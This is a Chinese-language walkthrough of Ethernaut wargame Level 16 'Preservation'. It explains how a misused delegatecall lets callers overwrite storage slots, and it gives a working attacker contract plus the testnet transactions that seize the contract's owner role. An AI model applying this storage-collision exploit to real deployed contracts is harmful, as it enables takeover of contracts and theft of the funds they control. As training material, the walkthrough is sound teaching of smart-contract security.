# Level 16: Preservation

## 1. 问题

有一个合约 `Preservation` , 这个合约 **原本** 想用2个 lib 库来分别存储一个 时间(timestamp)。他的实现有问题，想让你利用他的漏洞，把这个合约的 `owner` 改成自己。

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Preservation {
    // public library contracts
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint256 storedTime;
    // Sets the function signature for delegatecall
    bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

    constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {
        timeZone1Library = _timeZone1LibraryAddress;
        timeZone2Library = _timeZone2LibraryAddress;
        owner = msg.sender;
    }

    // set the time for timezone 1
    function setFirstTime(uint256 _timeStamp) public {
        timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
    }

    // set the time for timezone 2
    function setSecondTime(uint256 _timeStamp) public {
        timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
    }
}

// Simple library contract to set the time
contract LibraryContract {
    // stores a timestamp
    uint256 storedTime;

    function setTime(uint256 _time) public {
        storedTime = _time;
    }
}
```


## 2. 解法

原始合约的 bug 在于错误使用了 `delegatecall`。正常调用其他合约时，应该使用 `call`, 这样 `LibraryContract` 内的 `storedTime` 就会改为输入值。

当前合约使用 `delegatecall`, 则是相当于把这个代码拿到自己本地执行，修改的是自己合约内 `storage` 的槽内的值。

我们的攻击思路为：首先调用 `setFirstTime` 或者 `setSecondTime`, 将 `Preservation` 合约中第一个槽位的值，也就是 `timeZone1Library` 的值改成我们自己的攻击合约。然后再调用一次 `setFirstTime` 合约，执行我们攻击合约内部的逻辑，并且我们的攻击合约里的 `setTime` 函数改成修改第三个槽位值为 `tx.origin`，从而达到我们的效果。

> [!TIP]
> 这里我们提供一个测试文件 [Level16.t.sol](../../test/level16/Level16_localTest.t.sol)
> 可以在提交之前进行本地调试，调试成功再在测试链上执行

<br/>

1. 我们部署攻击合约, [部署交易](https://sepolia.etherscan.io/tx/0xfb94b76ab879626810d342eebaea5c7d9e16d8235c965eaeea256b6a0f631727) , 合约地址 [0xfb4a552417107cd1935d182c9832748da4510f9f](https://sepolia.etherscan.io/address/0xfb4a552417107cd1935d182c9832748da4510f9f)：

```solidity
contract HackPreservation {
    address public _placeholderTimezone1Library;
    address public _placeholderTimezone2Library;
    address public _placeholderOwner;

    constructor() {
    }
    
    function setTime(uint256 _time) public {
        // uint转换时截取低位
        _placeholderOwner = address(uint160(_time));
    }

}
```

2. 调用 `Preservation` 合约的 `setFirstTime` 接口，目标是将合约的地址值改成刚刚部署的 `HackPreservation` 合约的地址，所以我们需要指定传入的参数为合约地址转换成 `uint256`, [交易地址](https://sepolia.etherscan.io/tx/0x57244d7486e5c4fd8b725042471bce8b305f0c9c3a0924d1463590ef86365dfe)

![](../../resources/img/level16/addr2uint2562.png)

![](../../resources/img/level16/setFIrst12.png)

3. 此时我们查询可以确认，`timeZone1Library` 的值已经换成了我们刚刚部署的 `HackPreservation` 合约的地址：


![](../../resources/img/level16/new1Lib.png)


4. 次数我们再次调用 `Preservation` 合约的 `setFirstTime` 接口，实际会执行 `HackPreservation` 合约的 `setTime` 接口，这个函数里面会修改owner地址。注意此时的入参，需要填写我们发起的合约地址。[交易地址](https://sepolia.etherscan.io/tx/0xd5943ae17931f3ba68a67b785ed28c885631104df481cb996ce62b866bf36910)

![](../../resources/img/level16/setF2.png)

5. 此时我们查询，确认 `owner` 已经修改成我们要的地址了

![](../../resources/img/level16/newOwner.png)

6. 点击 `submit instance`， 提交通过！


<br/>
<br/>

| [⬅️ level15 Naught Coin](../level15_naughtcoin/README.md) | [level17 Recovery ➡️](../level17_recovery/README.md) |
|:------------------------------|--------------------------:|
